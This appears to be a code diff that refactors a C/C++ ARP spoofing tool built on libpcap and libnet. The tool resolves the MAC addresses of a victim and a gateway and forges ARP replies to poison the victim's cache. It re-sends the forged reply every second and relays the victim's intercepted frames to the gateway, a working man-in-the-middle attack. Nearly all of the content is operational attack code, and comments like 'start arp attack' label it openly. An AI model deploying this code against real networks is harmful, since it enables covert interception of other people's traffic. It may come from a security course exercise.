@@ -12,15 +12,18 @@
 #include <unistd.h>
 #include <malloc.h>
 #include <libnet.h>
+#include <time.h>
 
 //MAC주소 길이
 #define MAC_ALEN 6
 #define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]
 
+time_t time1 = time(NULL);
+
 #pragma pack(push, 1)
 struct EthArpPacket {
-	EthHdr eth_;
-	ArpHdr arp_;
+    EthHdr eth_;
+    ArpHdr arp_;
 };
 #pragma pack(pop)
 
@@ -60,42 +63,20 @@ int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
     char ipstr[40];
     //memcpy((void*)ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
     inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
-    printf("%s", ipstr);
     *ip_addr = Ip(ipstr);
     close(sockfd);
     return 0;
 }
 
-int main(int argc, char* argv[]) {
-    if (argc < 3) {
-		usage();
-		return -1;
-	}
+void SendArp(pcap_t* handle, EthArpPacket* packet){
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+}
 
-	char* dev = argv[1];
-    Ip s_ip(argv[2]);
-    Ip t_ip(argv[3]);
-
+void SendArpReq(pcap_t* handle, Mac MAC_ADD, Ip IP_ADD, Ip ip){
     EthArpPacket packet;
-    EthArpPacket attack_packet;
-
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
-
-    char errbuf_2[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
-
-    Mac MAC_ADD;
-    Mac MAC_GATEWAY;
-    Ip IP_ADD;
-
-    //MAC_ADD , IP_ADD is my mac & ip + gateway MAC_ADD..?
-    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
-
     //To get vicitm MAC address - arp request to victim
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
     packet.eth_.smac_ = Mac(MAC_ADD);
@@ -108,15 +89,15 @@ int main(int argc, char* argv[]) {
     packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
     packet.arp_.sip_ = htonl(IP_ADD); //my ip - any ip in here can get reply packet
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_ = htonl(s_ip);  //victim ip
+    packet.arp_.tip_ = htonl(ip);  //ip want to get MAC
 
     //ARP request packet to victim
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
+    SendArp(handle, &packet);
+}
 
-    //waiting for ARP reply packet from victim... to get vicitm MAC
+EthArpPacket GetArpReply(pcap_t* pcap, Mac MAC_ADD,Mac* MAC_GATEWAY, Ip s_ip, Ip t_ip){
+    EthArpPacket packet;
+
     while (true) {
             struct pcap_pkthdr* header;
             libnet_ethernet_hdr *eth_hdr;
@@ -136,44 +117,58 @@ int main(int argc, char* argv[]) {
                 continue;
             }
             EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
+
+            //get arp request from victim
             if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                 printf("Victim Mac Address Captured success\n");
-                MAC_GATEWAY = packet.arp_.tmac_;
                 packet.arp_.tmac_ = arp_packet->arp_.smac();
                 packet.eth_.dmac_ = arp_packet->arp_.smac();
+                continue;
+            }
+
+            //get arp request from victim
+            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == t_ip){
+                printf("Gateway Mac Address Captured success\n");
+                *MAC_GATEWAY = arp_packet->arp_.smac();
                 break;
             }
     }
 
-
-    //attack
+    //make attack packet
     printf("start arp attack");
     //destination mac is defined (victim mac)
     packet.eth_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
+    packet.eth_.type_ = htons(EthHdr::Arp);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
     packet.arp_.sip_ = htonl(t_ip); //gateway ip
     //victim mac is defined
     packet.arp_.tip_ = htonl(s_ip);  //victim ip
 
-    attack_packet = packet;
+    return packet;
+}
 
-    //attack packet
-    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
+void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Mac* MAC_GATEWAY){
+    //init attack
+    SendArp(handle, attack_packet);
 
     //relay to gateway
     //if not ARP packet, than relay to gateway all
     //waiting for ARP reply packet from victim... to get vicitm MAC
     while (true) {
+
+            time_t time2 = time(NULL);
+            if (time2 - time1 >= 1){
+                //attack packet to victim again
+                printf("\nreattack.. time gap : %02ld\n\n", time2-time1);
+                SendArp(handle, attack_packet);
+                time1 = time2;
+            }
+
             struct pcap_pkthdr* header;
             libnet_ethernet_hdr *eth_hdr;
 
@@ -188,57 +183,68 @@ int main(int argc, char* argv[]) {
 
             //hdr
             eth_hdr = (libnet_ethernet_hdr*)(out_packet);
-            libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(out_packet + sizeof(libnet_ethernet_hdr));
 
             //if get ARP packet from ???? than we attack again
             if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
-                //attack packet to victim
-                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-                //attack packet to gateway (10.2 is attacker mac)
-                /*
-                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                }
-                continue;
-                */
+                //attack packet to victim again
+                SendArp(handle, attack_packet);
             }
 
-            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
-               //printf("PASS! type : %d\n", ntohs(eth_hdr->ether_type));
-               continue;
-               }
-               if(ip_hdr_v4->ip_p != IPPROTO_TCP){
-                   //printf("PASS! protocol : %d\n", ip_hdr_v4->ip_p);
-                   continue;
-               }
-               printf("%u bytes captured\n", header->caplen);
-
-           //ethernet hdr source_mac
-           printf("\nsour MAC : ");
-           for (int i = 0; i<ETHER_ADDR_LEN; i++){
-               if (i == ETHER_ADDR_LEN-1){
-                   printf("0x%02x", eth_hdr->ether_shost[i]);
-               }
-               else{
-                   printf("0x%02x:", eth_hdr->ether_shost[i]);
-               }
-           }
-
            //make relay packetS
-           memcpy(eth_hdr->ether_dhost, &MAC_GATEWAY, ETHER_ADDR_LEN);
+           memcpy(eth_hdr->ether_dhost, MAC_GATEWAY, ETHER_ADDR_LEN);
 
+           printf("relay to gateway... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
            //relay to gateway
-           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_hdr), sizeof(EthArpPacket));
-           printf("%u bytes relayed to gateway\n", header->caplen);
+           res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_hdr), header->len);
 
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
     }
+}
 
-	pcap_close(handle);
+
+int main(int argc, char* argv[]) {
+    if (argc < 3) {
+        usage();
+        return -1;
+    }
+
+    char* dev = argv[1];
+    Ip s_ip(argv[2]);
+    Ip t_ip(argv[3]);
+
+    EthArpPacket packet;
+    EthArpPacket attack_packet;
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
+
+    char errbuf_2[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
+
+    Mac MAC_GATEWAY;
+    Mac MAC_ADD;
+    Ip IP_ADD;
+
+    //MAC_ADD , IP_ADD is my mac & ip
+    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
+
+    //Send ARP request to get victim MAC ADD
+    SendArpReq(handle,MAC_ADD, IP_ADD, s_ip);
+
+    //Send ARP request to get gateway MAC ADD
+    SendArpReq(handle,MAC_ADD, IP_ADD, t_ip);
+
+    //waiting for ARP reply packet from victim... to get vicitm MAC & make attack_packet
+    attack_packet = GetArpReply(pcap, MAC_ADD, &MAC_GATEWAY, s_ip, t_ip);
+
+    //attack packet
+    ArpSpoofing(pcap, handle, &attack_packet, &MAC_GATEWAY);
+
+    pcap_close(handle);
 }
